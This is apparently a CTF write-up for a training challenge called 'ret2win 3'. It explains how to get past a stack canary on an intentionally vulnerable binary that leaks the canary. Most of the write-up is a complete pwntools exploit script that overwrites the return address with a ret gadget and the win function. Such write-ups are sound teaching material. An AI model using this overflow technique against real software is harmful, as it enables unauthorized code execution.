---
description: Binary Exploitation
---

# ret2win 3

> Salah satu mitigasi dari buffer overflow di stack adalah canary. Canary adalah 8 byte random yang diletakkan sebelum saved RBP. Jadi, kalau kita overwrite saved RIP menggunakan buffer overflow, canary pasti akan ikut berubah. Canary akan diperiksa oleh program setiap sebelum keluar fungsi dan kalau canary-nya berubah dari sebelumnya, berarti telah terjadi buffer overflow dan program akan dihentikan. Tapi, kalau kita tau canary-nya, kita tinggal masukin ke payload kita di offset yang sesuai.
>
> Author: **zran**

{% file src="../../.gitbook/assets/ret2win3.zip" %}

First time learning canaries, a simple canary challenge where the binary leaks the canary for you and leaves you to work to return to the win function. Simple buffer overflow by finding the offset to the canary and the EIP.

Start by finding the offset to EIP with cyclic patterns:

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption><p>Breakpoint set at the canary comparison</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption><p>Cyclic lookup</p></figcaption></figure>

After replacing the correct offset with canary, find the offset to EIP which was 8 bytes and insert a stack alignment gadget followed by the win function:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ret2win --host playground.tcp1p.team --port 19002
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'ret2win')
context.terminal = ['tmux', 'splitw', '-h']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'playground.tcp1p.team'
port = int(args.PORT or 19002)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()

offset_eip = 120
ret = 0x000000000040101a
win = 0x0000000000401236

log.info(io.recvuntil(': '))
canary = int(io.recvline(), 16)
log.success(f"Canary Leak: {hex(canary)}")
log.info(io.clean())

payload = b'A' * 104
payload += p64(canary)
payload += b'A' * 8
payload += p64(ret)
payload += p64(win)

log.info(f"payload: {payload}")
io.sendline(payload)
log.info(io.clean())

io.interactive()
```

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
